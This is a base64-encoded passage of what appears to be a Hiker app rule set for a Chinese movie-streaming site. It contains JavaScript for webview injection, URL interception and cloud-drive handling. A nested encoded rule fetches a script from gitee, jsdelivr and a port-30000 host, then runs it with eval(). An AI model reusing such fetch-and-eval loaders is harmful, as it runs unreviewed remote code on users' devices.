cXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRbMF0udXJsID0gJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoYW5jaG9ySWQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGVzYyA9IGdldFZhcihhbmNob3JJZCwgXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVzYyA9PSBcXFwiMFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFg1RGVzYyhcXFwiZmxvYXQmJnNjcmVlbi0xNzBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKGFuY2hvcklkLCBcXFwiMVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hYNURlc2MoXFxcImZsb2F0JiYwXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihhbmNob3JJZCwgXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIGFuY2hvcklkICsgXFxcIng1XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkWzBdLnRpdGxlID0gXFxcIuWxleW8gC/mlLbotbdcXFwiICsgZFswXS50aXRsZTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihhbmNob3JJZCArIFxcXCJ4NVxcXCIsIFxcXCIwXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoWDVEZXNjKFxcXCJmbG9hdCYmMFxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBleHRyYSA9IGl0LmV4dHJhIHx8IHt9O1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhLmNscyA9IFxcXCJ4NWFpXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpdC5leHRyYSA9IGV4dHJhO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXCJ4NWFpXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoYW5jaG9ySWQsIGQpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoXFxcIkFJ5Yy56YWN5oiQ5YqfXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKFxcXCJwYXJzZUxhenlSdWxlQXN5bmM6XFxcIiArIGQubGVuZ3RoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZC5sZW5ndGggPiAwID8gXFxcIjFcXFwiIDogXFxcIjBcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSwgcnVsZSwgbG9jYXRpb24uaHJlZiwgYW5jaG9ySWQsIHdoaXRlKSwgJCQkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoXFxcIjBcXFwiID09IGlucHV0KSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jaGVja2MgPSB3aW5kb3cuY2hlY2tjICsgMTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLyppZiAod2luZG93LmNoZWNrYyA+IDEyMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmJhLmxvZyhcXFwi5omn6KGM6LaF6L+HMzDnp5LvvIzml6Dms5Xop6PmnpBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsqL1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vfVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jaGVja3VybCA9IGxvY2F0aW9uLmhyZWY7XFxuXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGNoZWNrdTAoKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmNoZWNrdXJsICE9IGxvY2F0aW9uLmhyZWYpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL2hhc2jlj5HnlJ/kuoblj5jljJZcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY2hlY2tjID0gMDtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2swKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMjAwMCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoY2hlY2t1MCwgMjUwKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja3UwKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xcbiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgICAgICAgICBmYmEubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgd2luZG93LmNoZWNrYyA9IDA7XFxuICAgICAgICAgICAgd2luZG93LmNoZWNrMCA9IGNoZWNrMDtcXG4gICAgICAgICAgICBjaGVjazAoKTtcXG4gICAgICAgIH1cXG4gICAgfSwgcnVsZSwgYW5jaG9ySWQsIHN0b3JhZ2UwLmdldEl0ZW0oXFxcIndoaXRlXFxcIiwgW10pKTtcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpppbpobVcIixcInBhdGhcIjpcImhvbWVcIixcInJ1bGVcIjpcInZhciBkID0gW107XFxubGV0IHVybCA9IOe9keermTtcXG5sZXQgYW5jaG9ySWQgPSB1cmw7XFxubGV0IGpzID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXCIpKE1ZX1JVTEUudGl0bGUsIGFuY2hvcklkKTtcXG5sZXQgaXRlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdVxcXCIpKE1ZX1JVTEUudGl0bGUsIGdldEhvbWUodXJsKSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgIGRlc2M6IFxcXCIxMDAlJiZmbG9hdFxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6IGl0ZSxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBqczoganMsXFxuICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWVcXG4gICAgfVxcbn0pO1xcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBpZDogYW5jaG9ySWRcXG4gICAgfVxcbn0pO1xcblxcbnNldFJlc3VsdChkKTtcIn1dLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCJMSUJWSU/op4LlvbHnvZHnq5lcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL3BhZ2UveXNmeD9ydWxlPUxJQlZJT+inguW9see9keermSZyPUxJQlZJT+inguW9see9keermSMjaHR0cHM6Ly93d3cubGlidmlvLmNjL3BsYXkvNzE0ODg5ODIzLTEtMS5odG1sXCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbmxldCBydWxlID0gZ2V0UGFyYW0oXFxcInJcXFwiKS5zcGxpdChcXFwiIyNcXFwiKVswXTtcXG5sZXQgdXJsID0gTVlfVVJMLnNwbGl0KFxcXCIjI1xcXCIpWzFdO1xcbmxldCBpdGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS91XFxcIikocnVsZSwgZ2V0SG9tZSh1cmwpKTtcXG5sZXQganMgPSAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgdHJ5IHtcXG4gICAgICAgIGlmIChkb2N1bWVudC50aXRsZSAmJiBkb2N1bWVudC50aXRsZS5sZW5ndGgpIHtcXG4gICAgICAgICAgICBsZXQgciA9ICQkJCgpLmxhenlSdWxlKCh0KSA9PiB7XFxuICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZSh0KTtcXG4gICAgICAgICAgICB9LCBkb2N1bWVudC50aXRsZSk7XFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wYXJzZUxhenlSdWxlKHIpO1xcbiAgICAgICAgfVxcbiAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICBmeV9icmlkZ2VfYXBwLmxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICB9XFxufSk7XFxubGV0IGpzMiA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3g1YWlcXFwiKShydWxlLCB1cmwpO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHVybEludGVyY2VwdG9yOiBpdGUsXFxuICAgICAgICBqczoganMgKyBcXFwiO1xcXFxuXFxcIiArIGpzMixcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWUsXFxuICAgICAgICBmbG9hdFZpZGVvOiB0cnVlXFxuICAgIH1cXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgaWQ6IHVybFxcbiAgICB9XFxufSk7XFxuc2V0UmVzdWx0KGQpO1wiLFwiZ3JvdXBcIjpcIuaIkeeahOW4uOeUqFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcInlzZnhcXFwiLFxcXCJwYXRoXFxcIjpcXFwieXNmeFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5sZXQgcnVsZSA9IGdldFBhcmFtKFxcXFxcXFwiclxcXFxcXFwiKS5zcGxpdChcXFxcXFxcIiMjXFxcXFxcXCIpWzBdO1xcXFxubGV0IHVybCA9IE1ZX1VSTC5zcGxpdChcXFxcXFxcIiMjXFxcXFxcXCIpWzFdO1xcXFxubGV0IGl0ZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS91XFxcXFxcXCIpKHJ1bGUsIGdldEhvbWUodXJsKSk7XFxcXG5sZXQganMgPSAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBpZiAoZG9jdW1lbnQudGl0bGUgJiYgZG9jdW1lbnQudGl0bGUubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICBsZXQgciA9ICQkJCgpLmxhenlSdWxlKCh0KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcXFxuICAgICAgICAgICAgfSwgZG9jdW1lbnQudGl0bGUpO1xcXFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wYXJzZUxhenlSdWxlKHIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICBmeV9icmlkZ2VfYXBwLmxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgIH1cXFxcbn0pO1xcXFxubGV0IGpzMiA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS94NWFpXFxcXFxcXCIpKHJ1bGUsIHVybCk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgIHVybDogdXJsLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcIng1X3dlYnZpZXdfc2luZ2xlXFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCIxMDAlJiZmbG9hdFxcXFxcXFwiLFxcXFxuICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6IGl0ZSxcXFxcbiAgICAgICAganM6IGpzICsgXFxcXFxcXCI7XFxcXFxcXFxuXFxcXFxcXCIgKyBqczIsXFxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxcXG4gICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXFxcbiAgICAgICAgZmxvYXRWaWRlbzogdHJ1ZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6IHVybFxcXFxuICAgIH1cXFxcbn0pO1xcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcInVcXFwiLFxcXCJwYXRoXFxcIjpcXFwidVxcXCIsXFxcInJ1bGVcXFwiOlxcXCIkLmV4cG9ydHMgPSBmdW5jdGlvbihydWxlLCBvcmlnaW4pIHtcXFxcbiAgICByZXR1cm4gJC50b1N0cmluZygocnVsZSwgb3JpZ2luKSA9PiB7XFxcXG4gICAgICAgIGxldCBob3N0ID0gb3JpZ2luLnJlcGxhY2UobmV3IFJlZ0V4cChcXFxcXFxcImh0dHA6Ly98aHR0cHM6Ly9cXFxcXFxcIiksIFxcXFxcXFwiXFxcXFxcXCIpLnNwbGl0KFxcXFxcXFwiL1xcXFxcXFwiKVswXTtcXFxcbiAgICAgICAgbGV0IGhvc3RzID0gaG9zdC5zcGxpdChcXFxcXFxcIi5cXFxcXFxcIik7XFxcXG4gICAgICAgIGlmIChob3N0cy5sZW5ndGggPiAyKSB7XFxcXG4gICAgICAgICAgICBob3N0ID0gaG9zdHNbaG9zdHMubGVuZ3RoIC0gMl0gKyBcXFxcXFxcIi5cXFxcXFxcIiArIGhvc3RzW2hvc3RzLmxlbmd0aCAtIDFdO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXFxcXFwibWFnbmV0XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICBjb25maXJtKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuKnppqjmj5DnpLpcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIuajgOa1i+WIsOaWsOeahOejgemTvuWcsOWdgO+8jOeCueWHu+ehruWumuaMiemSruWNs+WPr+aSreaUvu+8jOeCueWHu+WPlua2iOaMiemSruWPr+S7peWkjeWItumTvuaOpVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGNvbmZpcm06ICQudG9TdHJpbmcoKG1hZykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gbWFnO1xcXFxuICAgICAgICAgICAgICAgIH0sIGlucHV0KSxcXFxcbiAgICAgICAgICAgICAgICBjYW5jZWw6ICQudG9TdHJpbmcoKG1hZykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJjb3B5Oi8vXFxcXFxcXCIgKyBtYWdcXFxcbiAgICAgICAgICAgICAgICB9LCBpbnB1dClcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICAgICAgfSBlbHNlIGlmIChpbnB1dC5pbmNsdWRlcyhcXFxcXFxcImFsaXl1bmRyaXZlLmNvbVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgbG9nKGlucHV0KTtcXFxcbiAgICAgICAgICAgIGxldCByMSA9IGZldGNoKFxcXFxcXFwiaGlrZXI6Ly9ob21lQOS6keebmOaxh+W9sVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmICghcjEgfHwgcjEubGVuZ3RoIDw9IDUpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnUgPSAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwi5rW36ZiU6KeG55WM6KeE5YiZ5YiG5Lqr77yM5b2T5YmN5YiG5Lqr55qE5piv77ya5bCP56iL5bqP77+laG9tZV9ydWxlX3Yy77+lYmFzZTY0Oi8vQOS6keebmOaxh+W9sUBleUpzWVhOMFgyTm9ZWEIwWlhKZmNuVnNaU0k2SWlJc0luUnBkR3hsSWpvaTVMcVI1NXVZNXJHSDViMnhJaXdpWVhWMGFHOXlJam9pVFhKR2JIa2lMQ0oxY213aU9pSm9hV3RsY2pvdkwyVnRjSFI1SkNRa1pubHdZV2RsSWl3aWRtVnljMmx2YmlJNk5pd2lZMjlzWDNSNWNHVWlPaUowWlhoMFh6RWlMQ0pqYkdGemMxOXVZVzFsSWpvaUlpd2lkSGx3WlNJNkltRnNiQ0lzSW1Oc1lYTnpYM1Z5YkNJNklpSXNJbUZ5WldGZmJtRnRaU0k2SWlJc0ltRnlaV0ZmZFhKc0lqb2lJaXdpYzI5eWRGOXVZVzFsSWpvaUlpd2llV1ZoY2w5dVlXMWxJam9pSWl3aWMyOXlkRjkxY213aU9pSWlMQ0o1WldGeVgzVnliQ0k2SWlJc0ltWnBibVJmY25Wc1pTSTZJbXB6T2x4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeHVZV3hwTG1odmJXVlFZV2RsS0NrN0lpd2ljMlZoY21Ob1gzVnliQ0k2SW1ocGEyVnlPaTh2Wlcxd2RIa2tKQ1FxS2lRa0pHWjVjR0ZuWlNRa0pDSXNJbWR5YjNWd0lqb2k0cEdnNTcyUjU1dVlJaXdpYzJWaGNtTm9SbWx1WkNJNkltcHpPbHh1WlhaaGJDaG1aWFJqYUNnbmFHbHJaWEk2THk5bWFXeGxjeTl5ZFd4bGN5OXBZM2t2WVd4cExtcHpKeWtwTzF4dVlXeHBMbk5sWVhKamFGQmhaMlVvZEhKMVpTazdYRzRpTENKa1pYUmhhV3hmWTI5c1gzUjVjR1VpT2lKdGIzWnBaVjh4SWl3aVpHVjBZV2xzWDJacGJtUmZjblZzWlNJNkltcHpPbHh1WlhaaGJDaG1aWFJqYUNnbmFHbHJaWEk2THk5bWFXeGxjeTl5ZFd4bGN5OXBZM2t2WVd4cExtcHpKeWtwTzF4dVlXeHBMbVJsZEdGcGJGQmhaMlVvS1RzaUxDSnpaR1YwWVdsc1gyTnZiRjkwZVhCbElqb2liVzkyYVdWZk1TSXNJbk5rWlhSaGFXeGZabWx1WkY5eWRXeGxJam9pSWl3aWRXRWlPaUp0YjJKcGJHVWlMQ0p3Y21WU2RXeGxJam9pZG1GeUlHRnNhV3B6SUQwZ1ptVjBZMmdvSjJoMGRIQnpPaTh2WjJsMFpXVXVZMjl0TDJac2VURXpPVGN2YUdsclpYSXRhV041TDNKaGR5OXRZWE4wWlhJdllXeHBMbXB6SnlrN1hHNXBaaWdoWVd4cGFuTWdmSHdnSVdGc2FXcHpMbWx1WTJ4MVpHVnpLQ2RoYkdrbktTbDdYRzVjZEdGc2FXcHpJRDBnWm1WMFkyZ29KMmgwZEhCek9pOHZZMlJ1TG1welpHVnNhWFp5TG01bGRDOW5hQzltYkhreE16azNMMmhwYTJWeUxXbGplUzloYkdrdWFuTW5LVnh1ZlZ4dWFXWW9JV0ZzYVdweklIeDhJQ0ZoYkdscWN5NXBibU5zZFdSbGN5Z25ZV3hwSnlrcGUxeHVYSFJoYkdscWN5QTlJR1psZEdOb0tDZG9kSFJ3T2k4dmJHWnBZM2t1WTI5dE9qTXdNREF3TDIxeVpteDVMMmhwYTJWeUxXbGplUzl5WVhjdmJXRnpkR1Z5TDJGc2FTNXFjeWNwWEc1OVhHNXBaaWhoYkdscWN5a2dlMXh1WEhSM2NtbDBaVVpwYkdVb1hDSm9hV3RsY2pvdkwyWnBiR1Z6TDNKMWJHVnpMMmxqZVM5aGJHa3Vhbk5jSWl4aGJHbHFjeWs3WEc1Y2RHVjJZV3dvWVd4cGFuTXBPMXh1WEhSaGJHa3VjSEpsVW5Wc1pTZ3BPMXh1ZlZ4dUlpd2ljR0ZuWlhNaU9pSmJlMXdpWTI5c1gzUjVjR1ZjSWpwY0ltMXZkbWxsWHpOY0lpeGNJbTVoYldWY0lqcGNJdWU5a2VlYm1PaXZwdWFEaFZ3aUxGd2ljR0YwYUZ3aU9sd2laR1YwWVdsc1hDSXNYQ0p5ZFd4bFhDSTZYQ0pxY3pwY1hHNWxkbUZzS0dabGRHTm9LQ2RvYVd0bGNqb3ZMMlpwYkdWekwzSjFiR1Z6TDJsamVTOWhiR2t1YW5NbktTazdYRnh1WVd4cExtbHVhWFJEYjI1bWFXY29LVHRjWEc1aGJHa3VZV3hwVW5Wc1pTZ3BPMXdpZlN4N1hDSmpiMnhmZEhsd1pWd2lPbHdpYlc5MmFXVmZNVjlzWldaMFgzQnBZMXdpTEZ3aWJtRnRaVndpT2x3aTZMV0U1cnFRNTcyUjZhRzE2SyttNW9PRlhDSXNYQ0p3WVhSb1hDSTZYQ0p6YVhSbExXUmxkR0ZwYkZ3aUxGd2ljblZzWlZ3aU9sd2lhbk02WEZ4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeGNibUZzYVM1a1pYUmhhV3hRWVdkbEtDazdYQ0o5TEh0Y0ltTnZiRjkwZVhCbFhDSTZYQ0p0YjNacFpWOHpYQ0lzWENKdVlXMWxYQ0k2WENMa3VLcmt1cnJudlpIbm01am9yNmJtZzRWY0lpeGNJbkJoZEdoY0lqcGNJbVJ5YVhabFhDSXNYQ0p5ZFd4bFhDSTZYQ0pxY3pwY1hHNWxkbUZzS0dabGRHTm9LQ2RvYVd0bGNqb3ZMMlpwYkdWekwzSjFiR1Z6TDJsamVTOWhiR2t1YW5NbktTazdYRnh1WVd4cExtbHVhWFJEYjI1bWFXY29LVHRjWEc1aGJHa3ViWGxCYkdsU2RXeGxLQ2s3WENKOVhTSXNJbWxqYjI0aU9pSm9kSFJ3Y3pvdkwyZHBkR1ZsTG1OdmJTOW1iSGt4TXprM0wyaHBhMlZ5TFdsamVTOXlZWGN2YldGemRHVnlMMkZzYVhsMWJpNXdibWNpZlE9PVxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5rip6aao5o+Q56S6JyxcXFxcbiAgICAgICAgICAgICAgICAgICAgY29udGVudDogJ+acrOinhOWImeS+nei1luS6keebmOaxh+W9seinhOWIme+8jOeCueWHu+S4i+mdoueahOehruWumuaMiemSruWvvOWFpe+8jOazqOaEj+WvvOWFpeWQjuS4gOWumuimgeWcqOS6keebmOaxh+W9seeZu+W9lemYv+mHjOS6keebmOi0puWPt++8jOWQpuWImeS4jeiDveeUqCcsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbmZpcm06IHJ1LFxcXFxuICAgICAgICAgICAgICAgICAgICBjYW5jZWw6IHJ1XFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwiaW5wdXRcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6Zi/6YeM5LqR55uYXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGV0YWlsP3J1bGU95LqR55uY5rGH5b2xJnVybD1cXFxcXFxcIiArIHVybCArICc/P2Z5cGFnZScsXFxcXG4gICAgICAgICAgICAgICAgfSkpXFxcXG4gICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSlcXFxcbiAgICAgICAgfSBlbHNlIGlmICgvXFxcXFxcXFwuKG1wM3xmbGFjfG00YSkkLy50ZXN0KGlucHV0KSkge1xcXFxuICAgICAgICAgICAgbG9nKGlucHV0KTtcXFxcbiAgICAgICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBsYXlWaWRlbyh1cmwpO1xcXFxuICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpXFxcXG4gICAgICAgIH0gZWxzZSBpZiAoIWlucHV0LmluY2x1ZGVzKGhvc3QpICYmIGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICBsb2coaW5wdXQpO1xcXFxuICAgICAgICAgICAgcmV0dXJuICQudG9TdHJpbmcoKHVybCwgcnVsZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCB3aGl0ZSA9IFtcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJkb3V5aW5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJkb3ViYW5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJpeGlndWEuY29tXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwia3VhaXNob3VcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJiaWxpYmlsaVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIndlaWJvXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwid2VpeGluXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIF